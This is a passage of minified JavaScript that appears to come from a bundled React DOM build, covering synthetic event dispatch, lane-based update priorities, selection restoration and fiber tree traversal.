Sm=U({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Ds(e,t){if(t){if(Sm[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(o(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(o(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(o(61))}if(t.style!=null&&typeof t.style!="object")throw Error(o(62))}}function Ms(e,t){if(e.indexOf("-")===-1)return typeof t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Rs=null;function Ns(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Ls=null,nr=null,rr=null;function Kc(e){if(e=ni(e)){if(typeof Ls!="function")throw Error(o(280));var t=e.stateNode;t&&(t=ao(t),Ls(e.stateNode,e.type,t))}}function qc(e){nr?rr?rr.push(e):rr=[e]:nr=e}function Yc(){if(nr){var e=nr,t=rr;if(rr=nr=null,Kc(e),t)for(e=0;e<t.length;e++)Kc(t[e])}}function Qc(e,t){return e(t)}function Xc(){}var js=!1;function Zc(e,t,i){if(js)return e(t,i);js=!0;try{return Qc(e,t,i)}finally{js=!1,(nr!==null||rr!==null)&&(Xc(),Yc())}}function jr(e,t){var i=e.stateNode;if(i===null)return null;var s=ao(i);if(s===null)return null;i=s[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(i&&typeof i!="function")throw Error(o(231,t,typeof i));return i}var Bs=!1;if(h)try{var Br={};Object.defineProperty(Br,"passive",{get:function(){Bs=!0}}),window.addEventListener("test",Br,Br),window.removeEventListener("test",Br,Br)}catch{Bs=!1}function Tm(e,t,i,s,l,u,m,b,k){var R=Array.prototype.slice.call(arguments,3);try{t.apply(i,R)}catch(V){this.onError(V)}}var Fr=!1,Oi=null,zi=!1,Fs=null,Cm={onError:function(e){Fr=!0,Oi=e}};function Am(e,t,i,s,l,u,m,b,k){Fr=!1,Oi=null,Tm.apply(Cm,arguments)}function Pm(e,t,i,s,l,u,m,b,k){if(Am.apply(this,arguments),Fr){if(Fr){var R=Oi;Fr=!1,Oi=null}else throw Error(o(198));zi||(zi=!0,Fs=R)}}function Dn(e){var t=e,i=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(i=t.return),e=t.return;while(e)}return t.tag===3?i:null}function Jc(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function eu(e){if(Dn(e)!==e)throw Error(o(188))}function Em(e){var t=e.alternate;if(!t){if(t=Dn(e),t===null)throw Error(o(188));return t!==e?null:e}for(var i=e,s=t;;){var l=i.return;if(l===null)break;var u=l.alternate;if(u===null){if(s=l.return,s!==null){i=s;continue}break}if(l.child===u.child){for(u=l.child;u;){if(u===i)return eu(l),e;if(u===s)return eu(l),t;u=u.sibling}throw Error(o(188))}if(i.return!==s.return)i=l,s=u;else{for(var m=!1,b=l.child;b;){if(b===i){m=!0,i=l,s=u;break}if(b===s){m=!0,s=l,i=u;break}b=b.sibling}if(!m){for(b=u.child;b;){if(b===i){m=!0,i=u,s=l;break}if(b===s){m=!0,s=u,i=l;break}b=b.sibling}if(!m)throw Error(o(189))}}if(i.alternate!==s)throw Error(o(190))}if(i.tag!==3)throw Error(o(188));return i.stateNode.current===i?e:t}function tu(e){return e=Em(e),e!==null?nu(e):null}function nu(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=nu(e);if(t!==null)return t;e=e.sibling}return null}var ru=r.unstable_scheduleCallback,iu=r.unstable_cancelCallback,Im=r.unstable_shouldYield,Dm=r.unstable_requestPaint,Be=r.unstable_now,Mm=r.unstable_getCurrentPriorityLevel,Vs=r.unstable_ImmediatePriority,ou=r.unstable_UserBlockingPriority,_i=r.unstable_NormalPriority,Rm=r.unstable_LowPriority,su=r.unstable_IdlePriority,Wi=null,Bt=null;function Nm(e){if(Bt&&typeof Bt.onCommitFiberRoot=="function")try{Bt.onCommitFiberRoot(Wi,e,void 0,(e.current.flags&128)===128)}catch{}}var Et=Math.clz32?Math.clz32:Bm,Lm=Math.log,jm=Math.LN2;function Bm(e){return e>>>=0,e===0?32:31-(Lm(e)/jm|0)|0}var Ui=64,Hi=4194304;function Vr(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Gi(e,t){var i=e.pendingLanes;if(i===0)return 0;var s=0,l=e.suspendedLanes,u=e.pingedLanes,m=i&268435455;if(m!==0){var b=m&~l;b!==0?s=Vr(b):(u&=m,u!==0&&(s=Vr(u)))}else m=i&~l,m!==0?s=Vr(m):u!==0&&(s=Vr(u));if(s===0)return 0;if(t!==0&&t!==s&&(t&l)===0&&(l=s&-s,u=t&-t,l>=u||l===16&&(u&4194240)!==0))return t;if((s&4)!==0&&(s|=i&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=s;0<t;)i=31-Et(t),l=1<<i,s|=e[i],t&=~l;return s}function Fm(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Vm(e,t){for(var i=e.suspendedLanes,s=e.pingedLanes,l=e.expirationTimes,u=e.pendingLanes;0<u;){var m=31-Et(u),b=1<<m,k=l[m];k===-1?((b&i)===0||(b&s)!==0)&&(l[m]=Fm(b,t)):k<=t&&(e.expiredLanes|=b),u&=~b}}function Os(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function au(){var e=Ui;return Ui<<=1,(Ui&4194240)===0&&(Ui=64),e}function zs(e){for(var t=[],i=0;31>i;i++)t.push(e);return t}function Or(e,t,i){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-Et(t),e[t]=i}function Om(e,t){var i=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<i;){var l=31-Et(i),u=1<<l;t[l]=0,s[l]=-1,e[l]=-1,i&=~u}}function _s(e,t){var i=e.entangledLanes|=t;for(e=e.entanglements;i;){var s=31-Et(i),l=1<<s;l&t|e[s]&t&&(e[s]|=t),i&=~l}}var xe=0;function lu(e){return e&=-e,1<e?4<e?(e&268435455)!==0?16:536870912:4:1}var cu,Ws,uu,du,pu,Us=!1,$i=[],nn=null,rn=null,on=null,zr=new Map,_r=new Map,sn=[],zm="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function hu(e,t){switch(e){case"focusin":case"focusout":nn=null;break;case"dragenter":case"dragleave":rn=null;break;case"mouseover":case"mouseout":on=null;break;case"pointerover":case"pointerout":zr.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":_r.delete(t.pointerId)}}function Wr(e,t,i,s,l,u){return e===null||e.nativeEvent!==u?(e={blockedOn:t,domEventName:i,eventSystemFlags:s,nativeEvent:u,targetContainers:[l]},t!==null&&(t=ni(t),t!==null&&Ws(t)),e):(e.eventSystemFlags|=s,t=e.targetContainers,l!==null&&t.indexOf(l)===-1&&t.push(l),e)}function _m(e,t,i,s,l){switch(t){case"focusin":return nn=Wr(nn,e,t,i,s,l),!0;case"dragenter":return rn=Wr(rn,e,t,i,s,l),!0;case"mouseover":return on=Wr(on,e,t,i,s,l),!0;case"pointerover":var u=l.pointerId;return zr.set(u,Wr(zr.get(u)||null,e,t,i,s,l)),!0;case"gotpointercapture":return u=l.pointerId,_r.set(u,Wr(_r.get(u)||null,e,t,i,s,l)),!0}return!1}function fu(e){var t=Mn(e.target);if(t!==null){var i=Dn(t);if(i!==null){if(t=i.tag,t===13){if(t=Jc(i),t!==null){e.blockedOn=t,pu(e.priority,function(){uu(i)});return}}else if(t===3&&i.stateNode.current.memoizedState.isDehydrated){e.blockedOn=i.tag===3?i.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Ki(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var i=Gs(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(i===null){i=e.nativeEvent;var s=new i.constructor(i.type,i);Rs=s,i.target.dispatchEvent(s),Rs=null}else return t=ni(i),t!==null&&Ws(t),e.blockedOn=i,!1;t.shift()}return!0}function gu(e,t,i){Ki(e)&&i.delete(t)}function Wm(){Us=!1,nn!==null&&Ki(nn)&&(nn=null),rn!==null&&Ki(rn)&&(rn=null),on!==null&&Ki(on)&&(on=null),zr.forEach(gu),_r.forEach(gu)}function Ur(e,t){e.blockedOn===t&&(e.blockedOn=null,Us||(Us=!0,r.unstable_scheduleCallback(r.unstable_NormalPriority,Wm)))}function Hr(e){function t(l){return Ur(l,e)}if(0<$i.length){Ur($i[0],e);for(var i=1;i<$i.length;i++){var s=$i[i];s.blockedOn===e&&(s.blockedOn=null)}}for(nn!==null&&Ur(nn,e),rn!==null&&Ur(rn,e),on!==null&&Ur(on,e),zr.forEach(t),_r.forEach(t),i=0;i<sn.length;i++)s=sn[i],s.blockedOn===e&&(s.blockedOn=null);for(;0<sn.length&&(i=sn[0],i.blockedOn===null);)fu(i),i.blockedOn===null&&sn.shift()}var ir=B.ReactCurrentBatchConfig,qi=!0;function Um(e,t,i,s){var l=xe,u=ir.transition;ir.transition=null;try{xe=1,Hs(e,t,i,s)}finally{xe=l,ir.transition=u}}function Hm(e,t,i,s){var l=xe,u=ir.transition;ir.transition=null;try{xe=4,Hs(e,t,i,s)}finally{xe=l,ir.transition=u}}function Hs(e,t,i,s){if(qi){var l=Gs(e,t,i,s);if(l===null)la(e,t,s,Yi,i),hu(e,s);else if(_m(l,e,t,i,s))s.stopPropagation();else if(hu(e,s),t&4&&-1<zm.indexOf(e)){for(;l!==null;){var u=ni(l);if(u!==null&&cu(u),u=Gs(e,t,i,s),u===null&&la(e,t,s,Yi,i),u===l)break;l=u}l!==null&&s.stopPropagation()}else la(e,t,s,null,i)}}var Yi=null;function Gs(e,t,i,s){if(Yi=null,e=Ns(s),e=Mn(e),e!==null)if(t=Dn(e),t===null)e=null;else if(i=t.tag,i===13){if(e=Jc(t),e!==null)return e;e=null}else if(i===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Yi=e,null}function mu(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Mm()){case Vs:return 1;case ou:return 4;case _i:case Rm:return 16;case su:return 536870912;default:return 16}default:return 16}}var an=null,$s=null,Qi=null;function yu(){if(Qi)return Qi;var e,t=$s,i=t.length,s,l="value"in an?an.value:an.textContent,u=l.length;for(e=0;e<i&&t[e]===l[e];e++);var m=i-e;for(s=1;s<=m&&t[i-s]===l[u-s];s++);return Qi=l.slice(e,1<s?1-s:void 0)}function Xi(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Zi(){return!0}function vu(){return!1}function pt(e){function t(i,s,l,u,m){this._reactName=i,this._targetInst=l,this.type=s,this.nativeEvent=u,this.target=m,this.currentTarget=null;for(var b in e)e.hasOwnProperty(b)&&(i=e[b],this[b]=i?i(u):u[b]);return this.isDefaultPrevented=(u.defaultPrevented!=null?u.defaultPrevented:u.returnValue===!1)?Zi:vu,this.isPropagationStopped=vu,this}return U(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var i=this.nativeEvent;i&&(i.preventDefault?i.preventDefault():typeof i.returnValue!="unknown"&&(i.returnValue=!1),this.isDefaultPrevented=Zi)},stopPropagation:function(){var i=this.nativeEvent;i&&(i.stopPropagation?i.stopPropagation():typeof i.cancelBubble!="unknown"&&(i.cancelBubble=!0),this.isPropagationStopped=Zi)},persist:function(){},isPersistent:Zi}),t}var or={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Ks=pt(or),Gr=U({},or,{view:0,detail:0}),Gm=pt(Gr),qs,Ys,$r,Ji=U({},Gr,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Xs,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==$r&&($r&&e.type==="mousemove"?(qs=e.screenX-$r.screenX,Ys=e.screenY-$r.screenY):Ys=qs=0,$r=e),qs)},movementY:function(e){return"movementY"in e?e.movementY:Ys}}),bu=pt(Ji),$m=U({},Ji,{dataTransfer:0}),Km=pt($m),qm=U({},Gr,{relatedTarget:0}),Qs=pt(qm),Ym=U({},or,{animationName:0,elapsedTime:0,pseudoElement:0}),Qm=pt(Ym),Xm=U({},or,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),Zm=pt(Xm),Jm=U({},or,{data:0}),wu=pt(Jm),ey={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},ty={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},ny={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function ry(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=ny[e])?!!t[e]:!1}function Xs(){return ry}var iy=U({},Gr,{key:function(e){if(e.key){var t=ey[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=Xi(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?ty[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Xs,charCode:function(e){return e.type==="keypress"?Xi(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Xi(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),oy=pt(iy),sy=U({},Ji,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ku=pt(sy),ay=U({},Gr,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Xs}),ly=pt(ay),cy=U({},or,{propertyName:0,elapsedTime:0,pseudoElement:0}),uy=pt(cy),dy=U({},Ji,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),py=pt(dy),hy=[9,13,27,32],Zs=h&&"CompositionEvent"in window,Kr=null;h&&"documentMode"in document&&(Kr=document.documentMode);var fy=h&&"TextEvent"in window&&!Kr,xu=h&&(!Zs||Kr&&8<Kr&&11>=Kr),Su=" ",Tu=!1;function Cu(e,t){switch(e){case"keyup":return hy.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Au(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var sr=!1;function gy(e,t){switch(e){case"compositionend":return Au(t);case"keypress":return t.which!==32?null:(Tu=!0,Su);case"textInput":return e=t.data,e===Su&&Tu?null:e;default:return null}}function my(e,t){if(sr)return e==="compositionend"||!Zs&&Cu(e,t)?(e=yu(),Qi=$s=an=null,sr=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return xu&&t.locale!=="ko"?null:t.data;default:return null}}var yy={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Pu(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!yy[e.type]:t==="textarea"}function Eu(e,t,i,s){qc(s),t=io(t,"onChange"),0<t.length&&(i=new Ks("onChange","change",null,i,s),e.push({event:i,listeners:t}))}var qr=null,Yr=null;function vy(e){$u(e,0)}function eo(e){var t=dr(e);if(Ts(t))return e}function by(e,t){if(e==="change")return t}var Iu=!1;if(h){var Js;if(h){var ea="oninput"in document;if(!ea){var Du=document.createElement("div");Du.setAttribute("oninput","return;"),ea=typeof Du.oninput=="function"}Js=ea}else Js=!1;Iu=Js&&(!document.documentMode||9<document.documentMode)}function Mu(){qr&&(qr.detachEvent("onpropertychange",Ru),Yr=qr=null)}function Ru(e){if(e.propertyName==="value"&&eo(Yr)){var t=[];Eu(t,Yr,e,Ns(e)),Zc(vy,t)}}function wy(e,t,i){e==="focusin"?(Mu(),qr=t,Yr=i,qr.attachEvent("onpropertychange",Ru)):e==="focusout"&&Mu()}function ky(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return eo(Yr)}function xy(e,t){if(e==="click")return eo(t)}function Sy(e,t){if(e==="input"||e==="change")return eo(t)}function Ty(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var It=typeof Object.is=="function"?Object.is:Ty;function Qr(e,t){if(It(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var i=Object.keys(e),s=Object.keys(t);if(i.length!==s.length)return!1;for(s=0;s<i.length;s++){var l=i[s];if(!g.call(t,l)||!It(e[l],t[l]))return!1}return!0}function Nu(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Lu(e,t){var i=Nu(e);e=0;for(var s;i;){if(i.nodeType===3){if(s=e+i.textContent.length,e<=t&&s>=t)return{node:i,offset:t-e};e=s}e:{for(;i;){if(i.nextSibling){i=i.nextSibling;break e}i=i.parentNode}i=void 0}i=Nu(i)}}function ju(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?ju(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Bu(){for(var e=window,t=Fi();t instanceof e.HTMLIFrameElement;){try{var i=typeof t.contentWindow.location.href=="string"}catch{i=!1}if(i)e=t.contentWindow;else break;t=Fi(e.document)}return t}function ta(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function Cy(e){var t=Bu(),i=e.focusedElem,s=e.selectionRange;if(t!==i&&i&&i.ownerDocument&&ju(i.ownerDocument.documentElement,i)){if(s!==null&&ta(i)){if(t=s.start,e=s.end,e===void 0&&(e=t),"selectionStart"in i)i.selectionStart=t,i.selectionEnd=Math.min(e,i.value.length);else if(e=(t=i.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var l=i.textContent.length,u=Math.min(s.start,l);s=s.end===void 0?u:Math.min(s.end,l),!e.extend&&u>s&&(l=s,s=u,u=l),l=Lu(i,u);var m=Lu(i,s);l&&m&&(e.rangeCount!==1||e.anchorNode!==l.node||e.anchorOffset!==l.offset||e.focusNode!==m.node||e.focusOffset!==m.offset)&&(t=t.createRange(),t.setStart(l.node,l.offset),e.removeAllRanges(),u>s?(e.addRange(t),e.extend(m.node,m.offset)):(t.setEnd(m.node,m.offset),e.addRange(t)))}}for(t=[],e=i;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof i.focus=="function"&&i.focus(),i=0;i<t.length;i++)e=t[i],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Ay=h&&"documentMode"in document&&11>=document.documentMode,ar=null,na=null,Xr=null,ra=!1;function Fu(e,t,i){var s=i.window===i?i.document:i.nodeType===9?i:i.ownerDocument;ra||ar==null||ar!==Fi(s)||(s=ar,"selectionStart"in s&&ta(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),Xr&&Qr(Xr,s)||(Xr=s,s=io(na,"onSelect"),0<s.length&&(t=new Ks("onSelect","select",null,t,i),e.push({event:t,listeners:s}),t.target=ar)))}function to(e,t){var i={};return i[e.toLowerCase()]=t.toLowerCase(),i["Webkit"+e]="webkit"+t,i["Moz"+e]="moz"+t,i}var lr={animationend:to("Animation","AnimationEnd"),animationiteration:to("Animation","AnimationIteration"),animationstart:to("Animation","AnimationStart"),transitionend:to("Transition","TransitionEnd")},ia={},Vu={};h&&(Vu=document.createElement("div").style,"AnimationEvent"in window||(delete lr.animationend.animation,delete lr.animationiteration.animation,delete lr.animationstart.animation),"TransitionEvent"in window||delete lr.transitionend.transition);function no(e){if(ia[e])return ia[e];if(!lr[e])return e;var t=lr[e],i;for(i in t)if(t.hasOwnProperty(i)&&i in Vu)return ia[e]=t[i];return e}var Ou=no("animationend"),zu=no("animationiteration"),_u=no("animationstart"),Wu=no("transitionend"),Uu=new Map,Hu="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function ln(e,t){Uu.set(e,t),p(t,[e])}for(var oa=0;oa<Hu.length;oa++){var sa=Hu[oa],Py=sa.toLowerCase(),Ey=sa[0].toUpperCase()+sa.slice(1);ln(Py,"on"+Ey)}ln(Ou,"onAnimationEnd"),ln(zu,"onAnimationIteration"),ln(_u,"onAnimationStart"),ln("dblclick","onDoubleClick"),ln("focusin","onFocus"),ln("focusout","onBlur"),ln(Wu,"onTransitionEnd"),d("onMouseEnter",["mouseout","mouseover"]),d("onMouseLeave",["mouseout","mouseover"]),d("onPointerEnter",["pointerout","pointerover"]),d("onPointerLeave",["pointerout","pointerover"]),p("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),p("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),p("onBeforeInput",["compositionend","keypress","textInput","paste"]),p("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),p("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),p("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Zr="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Iy=new Set("cancel close invalid load scroll toggle".split(" ").concat(Zr));function Gu(e,t,i){var s=e.type||"unknown-event";e.currentTarget=i,Pm(s,t,void 0,e),e.currentTarget=null}function $u(e,t){t=(t&4)!==0;for(var i=0;i<e.length;i++){var s=e[i],l=s.event;s=s.listeners;e:{var u=void 0;if(t)for(var m=s.length-1;0<=m;m--){var b=s[m],k=b.instance,R=b.currentTarget;if(b=b.listener,k!==u&&l.isPropagationStopped())break e;Gu(l,b,R),u=k}else for(m=0;m<s.length;m++){if(b=s[m],k=b.instance,R=b.currentTarget,b=b.listener,k!==u&&l.isPropagationStopped())break e;Gu(l,b,R),u=k}}}if(zi)throw e=Fs,zi=!1,Fs=null,e}function Pe(e,t){var i=t[fa];i===void 0&&(i=t[fa]=new Set);var s=e+"__bubble";i.has(s)||(Ku(t,e,2,!1),i.add(s))}function aa(e,t,i){var s=0;t&&(s|=4),Ku(i,e,s,t)}var ro="_reactListening"+Math.random().toString(36).slice(2);function Jr(e){if(!e[ro]){e[ro]=!0,a.forEach(function(i){i!=="selectionchange"&&(Iy.has(i)||aa(i,!1,e),aa(i,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[ro]||(t[ro]=!0,aa("selectionchange",!1,t))}}function Ku(e,t,i,s){switch(mu(t)){case 1:var l=Um;break;case 4:l=Hm;break;default:l=Hs}i=l.bind(null,t,i,e),l=void 0,!Bs||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(l=!0),s?l!==void 0?e.addEventListener(t,i,{capture:!0,passive:l}):e.addEventListener(t,i,!0):l!==void 0?e.addEventListener(t,i,{passive:l}):e.addEventListener(t,i,!1)}function la(e,t,i,s,l){var u=s;if((t&1)===0&&(t&2)===0&&s!==null)e:for(;;){if(s===null)return;var m=s.tag;if(m===3||m===4){var b=s.stateNode.containerInfo;if(b===l||b.nodeType===8&&b.parentNode===l)break;if(m===4)for(m=s.return;m!==null;){var k=m.tag;if((k===3||k===4)&&(k=m.stateNode.containerInfo,k===l||k.nodeType===8&&k.parentNode===l))return;m=m.return}for(;b!==null;){if(m=Mn(b),m===null)return;if(k=m.tag,k===5||k===6){s=u=m;continue e}b=b.parentNode}}s=s.return}Zc(function(){var R=u,V=Ns(i),z=[];e:{var F=Uu.get(e);if(F!==void 0){var G=Ks,Q=e;switch(e){case"keypress":if(Xi(i)===0)break e;case"keydown":case"keyup":G=oy;break;case"focusin":Q="focus",G=Qs;break;case"focusout":Q="blur",G=Qs;break;case"beforeblur":case"afterblur":G=Qs;break;case"click":if(i.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":G=bu;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":G=Km;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":G=ly;break;case Ou:case zu:case _u:G=Qm;break;case Wu:G=uy;break;case"scroll":G=Gm;break;case"wheel":G=py;break;case"copy":case"cut":case"paste":G=Zm;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":G=ku}var X=(t&4)!==0,Fe=!X&&e==="scroll",E=X?F!==null?F+"Capture":null:F;X=[];for(var C=R,D;C!==null;){D=C;var _=D.stateNode;if(D.tag===5&&_!==null&&(D=_,E!==null&&(_=jr(C,E),_!=null&&X.push(ei(C,_,D)))),Fe)break;C=C.return}0<X.length&&(F=new 